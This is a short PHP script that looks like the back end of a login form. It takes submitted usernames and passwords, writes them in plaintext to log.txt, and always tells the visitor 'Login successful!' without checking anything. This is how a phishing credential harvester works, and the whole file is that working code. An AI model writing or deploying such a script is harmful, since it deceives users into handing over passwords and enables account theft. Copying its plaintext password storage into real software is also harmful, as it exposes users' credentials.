<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    file_put_contents('log.txt', "Username: $username, Password: $password\n", FILE_APPEND);
    echo 'Login successful!';
}
?>